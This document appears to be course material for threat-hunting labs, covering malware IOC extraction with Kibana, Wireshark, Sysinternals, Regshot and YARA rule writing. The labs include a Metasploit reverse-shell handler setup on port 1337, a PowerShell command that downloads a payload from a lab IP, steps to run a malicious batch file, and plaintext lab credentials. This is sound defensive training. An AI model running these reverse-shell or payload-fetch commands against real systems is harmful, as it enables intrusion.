The actors BRONZE PRESIDENT compromised a host and an analysis must be performed to identify IOCs, command lines run, and time the activity took place. The next two labs use a malware sample of BRONZE PRESIDENT that is neither malicious nor live. The labs present IOCs that overlap with characteristics from BRONZE PRESIDENT such as filenames, domains, directories, command lines, and persistence methods. A threat analysis on BRONZE PRESIDENT is provided in the section Additional Resource, following the lab.

﻿

Use Kibana to Extract Attributes for Reporting
﻿

Use Kibana to extract attributes from logs sent to a remote host.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome and select the bookmark Discover - Elastic from the bookmarks bar.

﻿

Selecting this bookmark displays the warning Your connection is not private. This is expected in this lab.

﻿

3. Select Advanced, then select proceed to 199.63.64.92 (unsafe). 

﻿

4. Log in to Elastic with the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Set the Kibana filter dates from Aug 5, 2022 @ 14:40:00.000 to Aug 5, 2022 @ 14:45:00.000, as displayed in Figure 23.3-8, below:




﻿

Figure 23.3-8﻿

﻿

6. Filter the logs to focus on a single host by entering the following in the search field above Add filter:

agent.name:bp-wkstn-1
﻿

Kibana can be set to display additional fields to help filter and view log data.

﻿

7. Add the field event.code by searching for it in the filter search box, then selecting the blue plus as displayed in Figure 23.3-9, below:


<img width="288" height="230" alt="image" src="https://github.com/user-attachments/assets/eb199d09-06b9-4171-8c70-6be1f5a2d55d" />





8. Repeat step 7 to add the following additional fields:
message
process.command_line
9. Filter the logs further to discover recently executed programs by entering the following in the search field:
agent.name:bp-wkstn-1 and event.code:1



The data in the column process.command_line displays the command lines executed.


10. Discover network connections and review the results by replacing the search field entry with the following:
agent.name:bp-wkstn-1 and event.code:3



11. Discover files recently created and review the results by replacing the search field entry with the following:
agent.name:bp-wkstn-1 and event.code:11



Steps 9 through 11 reveal suspicious activity. While this lab extracted attributes from logs sent to a remote host, the next lab focuses on extracting attributes from the endpoint.


Use Wireshark and PowerShell to Extract Additional Attributes for Reporting


BRONZE PRESIDENT actors compromised a workstation and the logs were already examined by the security operations center. Examine the affected host to create a clearer picture of the actions taken on the host by the malicious actors.


Workflow


1. Log in to the VM bp-wkstn-1 using the following credentials: 
Username: trainee
Password: CyberTraining1!



2. From the desktop, open the file BronzePresidentSim.pcapng with Wireshark. 


This file contains the network activity that occurred during the compromise and provides more information to analyze. Choosing the right filters reveals the files that should be reviewed and their locations on the system.


3. In Wireshark, right-click on the first TCP packet, select Follow, then select TCP stream and read through the output. 


The TCP stream displays that the first TCP packet uses a non-standard port. The output also mentions a URL, filename, and a directory. 


4. Use a text editor in the VM or any writing tool to record the information displayed as potential IOCs.


Before examining the file further, explore the additional information that is available in Wireshark. The URL listed in the output indicates that analyzing HTTP requests may help gather more information.


5. Search for HTTP requests by setting the display filter to the following:
http.request.method == GET



This filter displays various requests, some of which may be signatures.


6. Minimize Wireshark and launch PowerShell. 


7. Within PowerShell, change the directory to the Sysinternals directory by entering the following:
cd C:\Users\Trainee\Desktop\SysinternalsSuite



8. Search through the strings of the binary svchosts.exe to locate any command line activity by entering the following command:
.\strings64 /accepteula C:\Perflogs\svchosts.exe |Select-String "cmd.exe"



9. Repeat step 8 to search for files that were downloaded by replacing cmd.exe in the command with the each of the following:
adobe.exe
netview.exe
dllhosts.exe
PowerView
The same command line history is available in Sysmon (step 8 of the previous lab), so this is just another method to access that information.


Completing steps 8 and 9 reveals the locations for all the malicious files that have been added to the system. 


10. Hash the files with PowerShell by entering the following command:
Get-FileHash filename -Algorithm SHA1



Use the information from this lab to answer the following questions.
<img width="1069" height="621" alt="image" src="https://github.com/user-attachments/assets/449accc5-a35e-4a32-97d8-bae1e9b4720b" />
<img width="1021" height="596" alt="image" src="https://github.com/user-attachments/assets/9650da69-690e-4818-874b-5472db39462e" />
<img width="1114" height="622" alt="image" src="https://github.com/user-attachments/assets/28cb99b6-2a5a-4cfb-a97d-33cbefafbca7" />
<img width="1101" height="734" alt="image" src="https://github.com/user-attachments/assets/955de959-c903-49a6-98bd-d4a3d78715d3" />
<img width="948" height="527" alt="image" src="https://github.com/user-attachments/assets/bc386394-2a2d-43e3-9426-69b46c98746d" />



------------


### CDAH-M24L1-Extract Malware IOCs ###


Introduction to Malware IOCs
An IOC is any artifact on a system that suggests an intrusion by a malicious threat actor has occurred on that system. Common examples of IOCs include hashes of malicious files, records of attempted communication with malicious Uniform Resource Locators (URL) or Internet Protocol (IP) addresses, and records of computer system changes made by an attacker. IOCs can be referenced using MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) to aid in the identification of observed threat behavior. This helps analysts discover and understand the Tactics, Techniques, and Procedures (TTPs) used by an attacker to gain insight into the threat they present.

﻿

Malware IOCs
﻿

Analysts can use malware IOCs to identify threats from malicious software. This allows an analyst to detect a malware compromise through the correlation of known malicious behavior and activity observed on a host. Additionally, malware IOCs help analysts fingerprint the behavior of specific malware threats for use in a threat hunt. 

﻿

The following are example sources of malware IOCs:

Windows event logs
Network connections
Timestamps
Prefetch files
Registry edits
File contents or strings
File hashes
Windows Event Logs
﻿

Windows collects information on any system change, user activity, and application behavior that occurs on a host. This information is saved in various logs according to an event category. The categories of interest to malware behavior are typically labeled as follows: 

Application: Consist of events affecting a particular software, such as an error to start a web server.
Security: Track user activity regarding logon attempts, creating or modifying files, and other activity requiring authentication. 
System: Reflect events associated with failed drivers or other system components involving the operating system.
﻿

Network Connections
﻿

Network activity occurring on a host machine provides information regarding active Transmission Control Protocol (TCP) connections and various statistics involving Internet Protocol version 4 (IPv4) and Internet Protocol version 6 (IPv6) activity. TCP and User Datagram Protocol (UDP) ports on which the host is listening may indicate particular applications and services on the host that are open for communicating with another system.

﻿

Timestamps
﻿

File modification, access, creation, and MFT (Master File Table) entry modifications each are logged as attributes of a file with an associated timestamp in Windows. In Linux, files have timestamps recording access (atime), modification (mtime), and change (ctime). These timestamps can be used to determine when events occurred to a file. The timestamps are also useful for comparing logged activity on a system with changes made to certain files.

﻿

Prefetch Files
﻿

Windows stores information about applications run on a host within the prefetch folder. This folder is updated every time an application runs for the first time from a certain location on the host. The purpose of this is to speed up the process of running the same program in the future. The prefetch folder also allows an analyst to determine the applications a user ran and when.

﻿

Registry Edits
﻿

The Windows Registry is a database of information regarding settings, options, and other values for software and hardware installed on a system. Registry values can be changed as part of benign system changes, or they might be indicative of malware performing actions to maintain persistence on a compromised system.

﻿

File Contents/Strings
﻿

Files may contain readable text strings that provide insight into the purpose of the file, the file author, or other information that can be searched for through an automated process. This may result in the ability to identify new malware threats by locating a known text string present in a previously identified malicious file.

﻿

File Hashes
﻿

A cryptographic hash of a file is a unique value which corresponds to the file’s contents. This value remains the same if a file is either renamed or moved or copied to another location. However, the hash value changes if the contents of the file are altered. A file hash is valuable for identifying known malicious files as well as comparing known files for alterations.

﻿

Manual Searches for Malware IOCs
﻿

Native Windows utilities can be used to discover malware IOCs on a host, including the Windows Event Viewer for searching event logs, the command netstat for identifying network connections, and Registry Editor for viewing the Windows Registry. File timestamps and prefetch can be viewed using either File Explorer or the Windows command line. Specific text strings can be found using the command findstr and the PowerShell commandlet Get-FileHash provides hash values for files according to several different hashing algorithms.



------------


Discover Malware IOCs
The following lab involves a manual investigation to find IOCs on a host compromised by malware. The lab employs native Windows utilities to uncover evidence of remote access to the host by an attacker. This evidence is then collected to form IOCs, which can be used to search for similar behavior on other systems.

﻿

Find Malware IOCs
﻿

Identify IOCs using native Windows tools on a Windows host infected with malware.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Open the Metasploit Framework console by entering the following command:

msfconsole
﻿

4. Use a handler to listen on port 1337 for communications originating from an exploited host by entering each of the following five commands individually:

use payload/windows/shell_reverse_tcp
use exploit/multi/handler
set LHOST 10.10.64.51
set LPORT 1337
exploit
﻿

When the exploited host attempts to connect with kali-hunt, a TCP reverse shell shall be established. To enable this, keep kali-hunt active while switching to the second VM in the next step.

﻿

5. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

6. Return to kali-hunt to view the terminal window that displays the prompt C:\Windows\System32>﻿

﻿

7. In the terminal in kali-hunt, enter the following command at the prompt C:\Windows\System32>:

whoami
﻿

Below, Figure 24.1-1 displays the output from Step 7, which confirms a reverse TCP shell has been established, providing shell access to win-hunt from kali-hunt with the trainee credentials.


<img width="440" height="114" alt="image" src="https://github.com/user-attachments/assets/b0dbd874-da00-47bc-9965-acbe186cdcc8" />

This output from step 7 indicates that the system win-hunt has been compromised and simulates how a remote attacker can gain access to a system infected with malware. The rest of this lab focuses on finding evidence of the malware on win-hunt, which allows kali-hunt to gain remote access.


8. Return to win-hunt and open Command Prompt as an administrator. 


9. View the connections established between win-hunt and other hosts by entering the following command:
netstat



It may take a few moments for the netstat command to complete, before displaying an output similar to Figure 24.1-2, below. 

<img width="1072" height="212" alt="image" src="https://github.com/user-attachments/assets/b4a8415e-5ca7-4b68-b8ee-6020697eea48" />


This output shows one established connection between win-hunt (IP address 10.10.64.31) and another host on the network. This does not immediately identify malicious communication, however the attacker must be communicating over one of these connections.


10. Find the process ID associated with the connection to the IP address 10.10.64.51 by entering the following command: 
netstat -ano | find "1337"



The output should be similar to Figure 24.1-3, below:

<img width="1194" height="74" alt="image" src="https://github.com/user-attachments/assets/31163dc9-9a3e-48da-a5ba-265e53700dc3" />


NOTE: Although the process ID returned in the output above is 252, the actual value may be different when the command is executed in the lab. Whenever the rest of this lab refers to the value 252, this value should be replaced with whichever process ID is displayed after executing step 10 in the lab.


11. Identify the program associated with the process ID identified in step 10 by executing the following command (replacing 252 with the actual process ID):
tasklist | find "252"



The tasklist displays information about running processes and the pipe operator allows for the command find to return only the information regarding process ID specified. The results are similar to Figure 24.1-4, below. At this point, the tasklist information establishes that a program named sdf.exe has the process ID of 252, which is involved in the external communication to 10.10.64.51.

<img width="1240" height="82" alt="image" src="https://github.com/user-attachments/assets/d58dd380-fdb8-42f5-b2c2-d510a12a5313" />

12. Open File Explorer, select This PC, then select Local Disk (C:). 


13. Enter the following in the Search bar at the top right of the File Explorer and hit enter: 
sdf.exe



Searching for sdf.exe reveals that the location of the executable is C:\Windows\Temp\sdf.exe. 


14. Right-click on the search result and select Open file location.


By accessing the original file location, a copy of the sdf.exe file can be made for further examination. This file has been encoded so there is little information available from the file contents and a full behavioral analysis is beyond the scope of this lesson. However, the location of the file and its behavior make it seem suspicious. If it is malware, a persistence mechanism may exist on the system. 


Another way to find the file location of a process is to use PowerShell, as in the next step.


15. Open PowerShell and enter the following command to identify the process associated with sdf.exe: 
Get-Process | select -Property Name,Description | findstr sdf 



This displays sdf and the associated process ApacheBench command line utility. Using PowerShell is more effective than searching through File Explorer, especially when multiple processes share the same executable name. 


17. Exit PowerShell.




18. Open regedit and navigate to the following registry key:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run



The registry key provides an entry for C:\Windows\Temp\sdf.exe. This indicates that the Windows Registry was modified to run sdf.exe when the user trainee logs into win-hunt.


Summary


This lab described a simple process for discovering malware on a compromised host. In the process, the following four IOCs were uncovered:
IP 10.10.64.51 was communicating with win-hunt over port 1337.
Process ID 252 was found to be associated with the communication from IP 10.10.64.51.
Process ID 252 corresponds to the program sdf.exe.
The executable sdf.exe has a Windows Registry key value that allows for execution when a user logs into the system, establishing a network connection that persists after a logout or system shutdown event.

Native Windows tools do not necessarily make threat hunting an easy task. However, this lab provided specific clues early in the lab to jump start the investigation. The investigation started by uncovering the IP address for the system kali-hunt, which is 10.10.64.51.


Windows Event Logs were not examined in this lab because none of the malicious activity was logged according to default Windows event logging. Prior knowledge of attacker techniques, such as registry modification for persistence, are necessary to discover further information. The next section describes the Sysinternals suite of tools, which enhance Windows features for discovering attacker activity

<img width="1105" height="573" alt="image" src="https://github.com/user-attachments/assets/a503e768-d1db-44b0-bf0c-4c469717a5a7" />


--------------

Finding Malware IOCs with Sysinternals
The Sysinternals suite of tools provide several time- and labor-saving functions for managing a Windows host. For example, many of the manual tasks performed in the previous lab can be automated with Sysinternals. Although a full examination of each tool in the Sysinternals suite is beyond the scope of this lesson, the following tools for finding malware IOCs are described in this section:

Sysmon
Process Monitor
Process Explorer
Autoruns
TCPView
Sysmon
﻿

Sysmon captures information about running processes, network connections, and file changes on a host, similar to native Windows event monitoring tools. However, Sysmon's logs capture additional information that Windows' native tools do not, to provide a more in depth look into this information. Sysmon does not perform analysis of these logs or provide a user interface, so it is helpful to configure a system to ship these logs to a SIEM for analysis. A common way to use Sysmon logs is to send them to Elastic Stack to monitor for malicious activity on a system through queries and dashboards.

﻿

Process Monitor
﻿

Process Monitor displays file system, registry, and process information in real-time. This tool also provides an effective user interface for monitoring a system for malicious activity as it occurs. Process Monitor features filters, searching, and tooltips to provide a user-friendly means of troubleshooting system activity.

﻿

Process Explorer
﻿

Process Explorer performs a deep-dive analysis into processes running on a host to return the files, registry keys, and DLLs the processes have open as well as system resource utilization for each process. This allows an analyst to better understand the actions of a running process and identify potentially suspicious behavior.

﻿

Autoruns
﻿

Autoruns discovers programs that are configured to automatically start when a computer boots or when a user logs in. This is particularly useful for finding malware persistence mechanisms that abuse registry keys to aid in malware execution.

﻿

TCPView
﻿

TCPView provides detailed information about active TCP and UDP connections on a host. This information includes IP addresses, port numbers, count of packets sent, the name of the process involved in the communication, and more. This aids in the detection of malicious network activity affecting a host, such as command and control communications to and from a malicious external IP.

﻿

Regshot
﻿

Regshot is not a member of the Sysinternals suite of tools, however it is a valuable tool, nonetheless. Regshot provides snapshots to help analysts compare the state of a Windows registry before and after a compromise. Changes made to a system registry by malware can be discovered by analyzing the differences between snapshots from these two states.



------------


Discover Malware IOC Using Sysinternals
The following four labs walk through an investigation using Sysinternals tools, RegShot, and Command Prompt to find malware IOCs on a host compromised by malware. The labs are sequenced as follows:

Re-Establish Exploitation
Discover Malware IOCs Using Sysinternals
Compare Registry Snapshots with RegShot
Identify Malware Behavior with Strings Analysis
Re-Establish Exploitation
﻿

Complete the following workflow to re-establish the exploitation of win-hunt by kali-hunt from the previous lab. If these systems remain in the same state after the last lab, skip to the next lab.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Activate the Metasploit framework by entering the following command:

msfconsole
﻿

4. Enter each of the following five commands individually, hitting enter after each line:

use payload/windows/shell_reverse_tcp
use exploit/multi/handler
set LHOST 10.10.64.51
set LPORT 1337
exploit
﻿

Discover Malware IOCs Using Sysinternals
﻿

Use the Sysinternals tools TCPView, Autoruns, and Process Explorer to identify IOCs from the malware-infected windows host win-hunt.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Return to kali-hunt to ensure the terminal window that displays the prompt C:\Windows\System32>﻿

﻿

3. Return to win-hunt and open the folder SysinternalsSuite on the Desktop. 

﻿

4. Open the application tcpview64 and allow the program to run, if prompted.

﻿

By default, TCPView displays all active TCP v4, TCP v6, UDP v4, and UDP v6 communications. Many of these are system processes that are only communicating with the local host. 

﻿

5. Sort the rows by external addresses by selecting the column Remote Address twice. 

﻿

Executing step 9 presents the same two communications that are displayed when using netstat, as well as the process IDs and names. The columns indicate the application sdf.exe is communicating over TCP with the IP 10.10.64.51 over remote port 1337. 

﻿

6. Right-click on the row containing sdf.exe and select Process Properties to find more information about the application, including the file path of the executable C:\Windows\Temp\sdf.exe﻿

﻿

7. Close TCPView.

﻿

8. From the folder SysinternalsSuite on the Desktop, open Autoruns64. 

﻿

By default, Autoruns displays information about every application, DLL, device driver, and more, which have been configured to automatically execute at system startup or user log in. 

﻿

9. Select the tab Logon. 

﻿

The tab Logon displays that the first entry in the list is for the same registry key identified previously:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
﻿

Under the column Image Path, the second row in the list contains the file path for sdf.exe. 

﻿

10. Exit Autoruns.

﻿

11. From the folder SysinternalsSuite on the Desktop, open procexp64. 

﻿

This is Process Explorer, which provides a graphical view of all running processes. 

﻿

12. Scroll down to the end to find sdf.exe. 

﻿

Underneath the process sdf.exe are two child processes: cmd.exe and conhost.exe. This suggests that sdf.exe is providing remote terminal access. 

﻿

13. Explore additional data about the process by right-clicking on the process name sdf.exe and selecting Properties.

﻿

14. Exit Process Explorer and the folder SysinternalsSuite.

﻿

Compare Registry Snapshots with RegShot
﻿

Continue working in the VM win-hunt. Compare a snapshot of the current state of the Windows Registry that has an active exploitation with a version of the registry prior to exploitation. The resulting report on the differences between the two registry snapshots provides information regarding the current exploitation.

﻿

Workflow
﻿

1. From the folder Regshot on the Desktop, open Regshot. 

﻿

Regshot provides the ability to compare different states of the Windows Registry using snapshots. A snapshot of the Registry was taken prior to exploitation and is located in the folder Regshot. The snapshot file, clean.hiv, will be used to compare with the current state of the Registry. 

﻿

2. Select 1st shot, then select load.

﻿

3. Select clean.hiv, then select Open. 

﻿

4. Select 2nd shot, then select Shot from the pop-up menu. 

﻿

5. Select Compare when it becomes available.

﻿

Regshot displays results as a simple text document, by default. 

﻿

6. Search for sdf.exe. 

﻿

Several entries match the search. This shows that this application did not have any registry entries prior to exploitation. 

﻿

7. Exit Regshot.

﻿

Identify Malware with Strings Analysis
﻿

Continue working in the VM win-hunt. Use the Sysinternals tool strings64.exe to parse human-readable strings from the file sdf.exe to search for additional information to help determine whether the file is malicious.

﻿

Workflow
﻿

1. Open Command Prompt and use it to navigate to the folder SysinternalsSuite on the Desktop.

﻿

2. In command prompt, execute the following command:

strings64.exe C:\Windows\Temp\sdf.exe | more
﻿

This command displays all character strings found in the file sdf.exe and pipes the output to more so that it is easier to read. With some patience, many human-readable strings can be found, suggesting the use of Apache as a web server. This provides insight into the behavior of sdf.exe and provides additional IOCs that were not available with just native Windows tools. 

﻿

3. Exit Command Prompt.

﻿

This lab illustrates how gathering IOCs for the malware sdf.exe is significantly easier through tools in the Sysinter nals suit e, as opposed to tools native to Windows. Additionally, prior knowledge of attacker techniques were not necessary to hunt down the registry changes for the establishment of persistence. Regshot also provided proof that these registry changes had been made after a clean snapshot of the registry was made prior to the system compromise.


<img width="1128" height="662" alt="image" src="https://github.com/user-attachments/assets/1656db0f-876d-4f34-878a-da34fcc3ac72" />



-----------------


Creating a YARA Rule for Malware-Related IOCs
YARA is a pattern-matching tool that can be used to identify malware according to predefined signatures. These signatures consist of one or more character strings and conditions that an analyst has identified as key indicators of a certain type of malicious activity. A YARA rule consists of a simple definition of such a signature in a format which resembles a portion of C programming code.

﻿

A Simple YARA Rule
﻿

YARA rules are designed very simplistically. A rule name is defined, followed by one or more strings to match for (assuming strings will be used in the rule), and a condition by which the match is defined. An example of a simple YARA rule is as follows:

rule MyFirstYaraRule
{
	strings:
		$string1 = “hello”
		$string2 = “world”

	condition:
		$string1 and $string2
}
﻿

NOTE: When copying and pasting YARA rules into the VM, the syntax should be verified.

﻿

The rule above is named MyFirstYaraRule and is defined to trigger a positive match if both strings hello and world are present in a file being inspected.

﻿

Rules with Multiple Conditions
﻿

Multiple conditions can be used in YARA rules to aid in the prevention of false positive and false negative evaluations. Additionally, several keywords can be used to qualify strings, as in the following example:

rule MySecondYaraRule
{
	strings:
		$string1 = “hello” wide ascii nocase
		$string2 = “world” wide ascii nocase
		$string3 = “This program cannot be run in DOS mode” base64
$hex1 = { F2 21 C? 16 ?? 00 } 

	condition:
		($string1 or $string2) and ($string3 or $hex1)
}
﻿

This rule adds the string modifiers wide, ascii, and nocase, which match unicode and ascii versions of the character strings without case sensitivity. Case insensitivity is helpful for matching a certain string which may be formatted differently in an executable file. The modifier base64 searches for an encoded version of the supplied string. 

﻿

YARA’s string matching is not limited to human-readable text. As a pattern-matching tool, YARA can also search for hexadecimal strings as defined above as $hex1.

﻿

The definition of the pattern-match condition is a little more complex. A positive match involves the detection of two possible strings. Either $string1 or $string2 and either $string3 or $hex1. Therefore, to produce a match for this rule, an analyzed malware file must contain either hello or world as a string, as well as either the base64-encoded string This program cannot be run in DOS mode or the defined hexadecimal string. Adding this amount of specificity to a YARA rule may reduce both false positives and false negatives, provided that these string values and conditions are appropriate for detecting specific malicious code.

﻿

In addition to the conditional modifiers and and or, the modifiers any, all, and none can also be used as seen below:

any of them
hex1 and any of ($string)
$hex1 and all of them
all of ($string) or ($hex1 and none of ($string)) 
﻿

Malware IOCs can provide the information necessary to create a YARA rule to detect known malicious software. The next lab demonstrates this technique.



-------------



Detect Malware with a YARA Rule
The next lab creates a YARA rule to identify malware. This is performed by matching specific strings and conditions and altering them while troubleshooting a YARA rule.

﻿

Detect Malware through YARA Rule
﻿

Create a simple YARA rule to match a character string for malware detection.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Use Command Prompt to navigate to the folder YARA, which is located on the Desktop.

﻿

3. Create a new file named myrule.yar in Notepad by entering the following command:

notepad myrule.yar
﻿

NOTE: If prompted, confirm that a new file is to be created.

﻿

4. Enter the following YARA rule into the file:

rule MyRule
{
	strings:
		$string1 = “Apache”
		$string2 = “This program cannot be run in DOS mode” base64

	condition:
		$string1 or $string2
}
﻿

This simple rule declares two strings with a condition that either one of these strings must be present in the file to indicate a match. 

﻿

5. Save the file myrule.yar﻿

﻿

6. In Command Prompt, test the YARA rule against sdf.exe by entering the following command:

yara32.exe myrule.yar C:\Windows\Temp\sdf.exe
﻿

This command outputs the following, which indicates a pattern match for MyRule against sdf.exe.

MyRule C:\Windows\Temp\sdf.exe
﻿

7. Edit the condition of the YARA rule so that both strings must be present for a match by replacing or with and﻿

﻿

8. Run the following command:

yara32.exe myrule.yar C:\Windows\Temp\sdf.exe
﻿

This outputs a blank line, which indicates no matches. Both strings are present in sdf.exe, but the second string is not base64-encoded. This is why the new conditional statement results in no matches.

﻿

9. Edit the YARA rule by removing the modifier base64 from $string2﻿

﻿

10. Run the following command:

yara32.exe myrule.yar C:\Windows\Temp\sdf.exe
﻿

This results in a positive match. Writing and editing YARA rules can produce excellent signatures for malware detection based on known characteristics, such as the presence of an Apache web server within a Windows executable. Further refinement of rules are necessary to avoid false positives and to detect different versions of similar malware. The ability to run YARA from the command line with text-based rules allows for scripting advanced incident response tools to detect malicious software that may not have a traditional antivirus signature. This is one way in which the collection of malware IOCs can enhance the defense of host systems.


Knowledge Check
A malware file has been identified. It contains the strings psapi.dll, EnumDeviceDrivers, GetKeyState, and htSwkyP.exe, which the following rule incorporates in a signature:

rule malware2287B
{
	strings:
		$string1 = “psapi.dll”  wide ascii
		$string2 = “EnumDeviceDrivers” wide ascii
		$string3 = “GetKeyState”  wide ascii
		$string4 = “htSwkyP.exe”  wide ascii

	condition:
		$string1 and $string2 and $string3 and $string4
}
﻿

This rule’s current condition requires every string to be present in a file to generate a positive match.

﻿

Question:
﻿

Which rule condition allows a positive match if psapi.dll and htSwkyP.exe or the second and third strings are present in a file?

<img width="1138" height="678" alt="image" src="https://github.com/user-attachments/assets/5add83c6-cbb4-4985-805c-315854740aa4" />
 use -r when running yara rules
 
------------

### CDAH-M24L2-Execute a Malware Threat Hunt ###


Malware Threat Behavior
Discovering a malware threat starts with discovering malware-related IOCs. The context of IOCs helps Host Analysts determine what type of threat the malware poses to a compromised system and other hosts in a network. Malware may perform several actions on a compromised host. Regardless of the intent of the malware, changes made to a system are observable and provide insight into the nature of the malicious software. 

﻿

Detecting Malware IOCs
﻿

Malware leaves evidence of its actions through system logs, Windows Registry changes, file system modifications, and other system changes necessary to accomplish its malicious goals. These activities produce IOCs, which can be used to detect malware behavior on a compromised host.

﻿

For example, assume a host is compromised. The following IOCs are discovered:

A certain registry key was modified to execute s3Ummo.exe when a designated administrative user logs in.
Additional files have been added to the file system in the administrative user’s profile directories, each with apparently random names, yet all contain the strings “Cannot be run in DOS mode” and “IsDebuggerPresent.” 
Additionally, assume the following information is discovered about executable s3Ummo.exe:

The executable contains the strings “Apache” and “web server.”
The executable is added to the allowlist used by the installed antivirus program.
The executable is associated with a process which establishes communication with an external IP.
The executable is added as an exception to the Windows Firewall, allowing all communication.
Individually, each malware IOC fails to describe the full capacity of the threat s3Ummo.exe poses to the compromised host and network. However, the malware threat behavior derived from each of the IOCs provides more context.  

﻿

The malware s3Ummo.exe executes when a designated user with administrative rights logs in, which then establishes a process allowing network communication to a host external to the network. 

﻿

Figure 24.2-1 below illustrates the attack chain:


<img width="1667" height="694" alt="image" src="https://github.com/user-attachments/assets/6cd4031d-c907-4288-a071-746186dd9714" />

Antivirus and Windows Firewall allow s3Ummo.exe to execute and establish network communications through allowlisting. The malware s3Ummo.exe may be acting as an Apache web server. The additional files are downloaded to an uncommon location and contain strings suggesting that they are executable files that determine if a debugger is present. Thus, adversaries may be implementing anti-forensics techniques.


Although the full nature of s3Ummo.exe is not described through these observed IOCs, there is enough information to suggest that the threat behavior involves allowing unauthorized remote access along with the delivery of second-stage malware. 


-----------------


Discover Malware IOCs
A user on the mission partner’s network reports a suspicious email. Network Analysts identify the malicious email and extract the malicious payload.

﻿

A copy of the binary and the script are provided in a folder on the win-hunt desktop. Determine IOCs that can be used to detect the malware’s deployment.

﻿

The following information pertains to the lab environment:

No variants of the malware are present.
Access to a remote computer belonging to the attacker is provided.
Trainees may safely perform malware analysis by running the malware on the provided Virtual Machine.
Generate a list of IOCs that can be used to perform a hunt for the malware.

﻿

Workflow 
﻿

1. Log in to the Virtual Machine (VM) win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the Malware_Payload folder.

﻿

3. Open the Update Windows folder. 

﻿

4. Right-click on the updatewindows.bat file and select Open with Sublime Text.

﻿

5. Examine the file to determine the actions of the script. 

﻿

Use the results of this lab to answer the following question.


<img width="1138" height="480" alt="image" src="https://github.com/user-attachments/assets/2707e0cd-6b1b-408c-8183-accc93374f39" />

<img width="1087" height="525" alt="image" src="https://github.com/user-attachments/assets/0352fc3c-eeb3-4e50-8ae2-8ecd4fb9e36a" />

<img width="1111" height="552" alt="image" src="https://github.com/user-attachments/assets/6097567d-2552-4a50-a89e-1688f3deaf0e" />


-------------

Malware IOCs and Data Capture
The malware relies on tricking a user into executing a simple batch file that downloads the payload pl.exe via PowerShell, then executes it after adding autorun entries to persist the payload.

﻿

Data Capture
﻿

Document the malicious Uniform Resource Locator (URL) and the Internet Protocol (IP) address of the URL. 

﻿
Workflow
﻿

1. From the win-hunt VM, open a PowerShell terminal.

﻿

2. Download the payload by entering the following commands:

PS C:\Users\trainee> cd Desktop
PS C:\Users\trainee\Desktop> Invoke-Webrequest -o .\pl.donotexecute http://199.63.64.51/pl.exe 
﻿

3. Collect the SHA1 and MD5 hashes by entering the following commands:

PS C:\Users\trainee\Desktop> Get-FileHash -Algorithm SHA1 .\pl.donotexecute
PS C:\Users\trainee\Desktop> Get-FileHash -Algorithm MD5 .\pl.donotexecute
﻿

4. Collect the SHA1 and MD5 hashes for the  updatewindows.zip  file by entering the following commands:

PS C:\Users\trainee\Desktop> Get-FileHash -Algorithm SHA1 .\Malware_Payload\updatewindows\updatewindows.bat
PS C:\Users\trainee\Desktop> Get-FileHash -Algorithm MD5 .\Malware_Payload\updatewindows\updatewindows.bat
﻿

5. Double-click Process Monitor. 

﻿

6. Select OK when prompted to restore previous filters.

﻿

7. Minimize the Process Monitor window.

﻿

8. Open Wireshark and select Ethernet1.

﻿

9. Select Capture, and then select Start.

﻿

10. Execute the malware by running the UpdateWindows.bat file. 

﻿

11. Allow the malware to run for two minutes and continue the workflow steps below as the capture is in progress.

﻿

NOTE: Malware should only be executed in a controlled environment, such as this lab. When malware cannot be executed safely, perform static analysis instead. 

﻿

12. Open Task Manager and select the Details tab. 

﻿

13. Select the pl.exe process.

﻿

14. After the two minutes have passed from Step 11, select End Task.

﻿

15. Select Capture, and then select Stop to end the Wireshark capture.

﻿

16. Select File then Capture Events to stop the Process Monitor event capture. 

﻿

The indicator for whether or not events are being captured can be subtle. When events are being captured, the icons for the toolbar and menu item have a blue background. 

﻿

Keep the Wireshark window open to use in the next workflow.


----------------


Analyze Captured Data for IOCs
The data captured in the previous workflow must be analyzed for IOCs related to the malware. 

﻿

Parse through a Wireshark capture for connection information and analyze captured events in Process Monitor for host-based IOCs.

﻿
Workflow
﻿

1. From the existing Wireshark window, select Statistics, and then select Endpoints.

﻿

2. Select the TCP tab.

﻿

The IP address of the win-hunt machine is 199.63.64.31. Two endpoints exist on 199.63.64.51. One on port 80 and another on port 1337. The connection on port 80 was used to download the malicious payload. The connection on port 1337 was likely created by the malware. The malware creates connections on port 1337 to the specific endpoint of 199.63.64.51.

﻿

3. In the Process Monitor window, select Filter and then select Filter again.

﻿

4. Set the Process Monitor Filter values to Operation is RegCreateKey, as shown in Figure 24.2-2 below:


<img width="1176" height="722" alt="image" src="https://github.com/user-attachments/assets/15701f07-ca06-4c42-9d73-f95947830e91" />

5. Select Add, and then select OK to add and close out the filter window.


Within this dataset, a significant amount of traffic is created by the powershell.exe and reg.exe processes.


However, as shown in Figure 24.2-3 below, the key being set is not displayed:

<img width="2040" height="1312" alt="image" src="https://github.com/user-attachments/assets/16145f01-5690-407c-a2fa-2451a642cd4b" />

6. Open the Process Monitor Filter window by selecting Filter, and then select Filter again.


7. Select the Operation is RegCreateKey entry, as shown in Figure 24.2-4 below:

<img width="1182" height="724" alt="image" src="https://github.com/user-attachments/assets/44532629-4783-444c-8336-06d6be9e83cd" />

8. Select Remove.


9. Add a new filter. Set the Process Monitor Filter values to Operation is RegSetValue. 


10. Select Add.


11. Select OK to close the Process Monitor Filter window.


12. Hover over the Detail column for the reg.exe entries to see the data being written to this registry key. 


